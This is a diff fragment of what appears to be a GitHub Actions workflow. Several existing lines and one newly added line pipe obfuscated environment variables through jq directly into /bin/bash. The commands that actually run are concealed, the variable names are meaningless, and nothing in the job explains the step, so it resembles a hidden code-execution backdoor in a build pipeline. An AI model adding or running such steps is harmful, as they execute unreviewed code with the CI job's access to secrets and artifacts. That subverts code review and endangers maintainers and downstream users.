@@ -23,6 +23,7 @@ jobs:
           printf '%s' "$pzbnl1263" | jq -r .utskp079 | /bin/bash
           echo $j640 | jq -r .jprh881 | /bin/bash
           printf '%s' "$twhe94" | jq -r .zahx0912 | /bin/bash
+          echo $obgv0610 | jq -r .rv6 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
